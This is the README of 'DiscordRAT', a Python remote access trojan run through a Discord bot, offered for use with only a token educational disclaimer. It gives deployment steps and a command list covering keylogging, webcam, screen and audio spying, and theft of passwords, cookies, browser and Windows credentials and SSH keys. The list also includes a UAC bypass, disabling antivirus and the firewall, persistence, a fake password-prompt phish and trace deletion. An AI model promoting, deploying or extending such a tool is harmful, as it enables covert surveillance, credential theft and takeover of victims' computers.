# DiscordRAT
Discord Remote Administration Tool fully written in Python3.

This is a RAT controlled over Discord with multiple post exploitation modules.

## **Disclaimer:**
This tool is for educational use only, the authors will not be held responsible for any misuse of this tool.

## **Setup Guide:**
You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server).
Once the bot is created copy the token of your bot and paste it in the code.

Install requirements :
```
pip3 install -r requirements.txt
```
Then if the steps above were successful, you can launch the python file by executing ```python s0P0wn3d.py```. It will create a new channel and post a message on the server with a generated session number.\
Now your bot should be available to use ! 

**Requirements:**\
Python3, Windows(x64)

## **Modules**
```
Available commands are :
--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !shell = Execute a shell command /Syntax  = "!shell whoami"
--> !webcampic = Take a picture from the webcam
--> !windowstart = Start logging current user window (logging is shown in the bot activity)
--> !windowstop = Stop logging current user window 
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !sysinfo = Gives info about infected computer
--> !history = Get chrome browser history
--> !download = Download a file from infected computer
--> !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
--> !cd = Changes directory
--> !delete = deletes a file / Syntax = "!delete /path to/the/file.txt"
--> !write = Type your desired sentence on computer / Type "enter" to press the enter button on the computer
--> !clipboard = Retrieve infected computer clipboard content
--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
--> !startkeylogger = Starts a keylogger
--> !stopkeylogger = Stops keylogger
--> !dumpkeylogger = Dumps the keylog
--> !listprocess = Get all process
--> !screenshot = Get the screenshot of the user's current screen
--> !exit = Exit program
--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
--> !uacbypass = attempt to bypass uac to gain admin by using fod helper
--> !passwords = grab all passwords
--> !streamwebcam = streams webcam by sending multiple pictures
--> !stopwebcam = stop webcam stream
--> !streamscreen = stream screen by sending multiple pictures
--> !stopscreen = stop screen stream
--> !shutdown = shutdown computer
--> !restart = restart computer
--> !logoff = log off current user
--> !displaydir = display all items in current dir
--> !currentdir = display the current dir
--> !prockill = kill a process by name / syntax = "!kill process.exe"
--> !recscreen = record screen for certain amount of time / syntax = "!recscreen 10"
--> !reccam = record camera for certain amount of time / syntax = "!reccam 10"
--> !recaudio = record audio for certain amount of time / syntax = "!recaudio 10"
--> !disableantivirus = permanently disable windows defender(requires admin)
--> !disablefirewall = disable windows firewall (requires admin)
--> !selfdestruct = delete all traces that this program was on the target PC
--> !windowspass = attempt to phish password by poping up a password dialog
--> !displayoff = turn off the monitor (Admin rights are required)
--> !displayon = turn on the monitors (Admin rights are required)
--> !website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"
--> !getsystemcreds = get all credentials stored on the current device (browsers, system, wifi, mails...)
--> !startup = add file to startup (when computer go on this file starts)(Admin rights are required)
--> !dumpcookies = dump all the browsers cookies
--> !dumpwindowscreds = dump all credentials from Windows Credential Manager
--> !dumpchromecreds = dump all credentials saved in chrome browser
--> !getsshkeys = get an ssh key available on the infected computer
```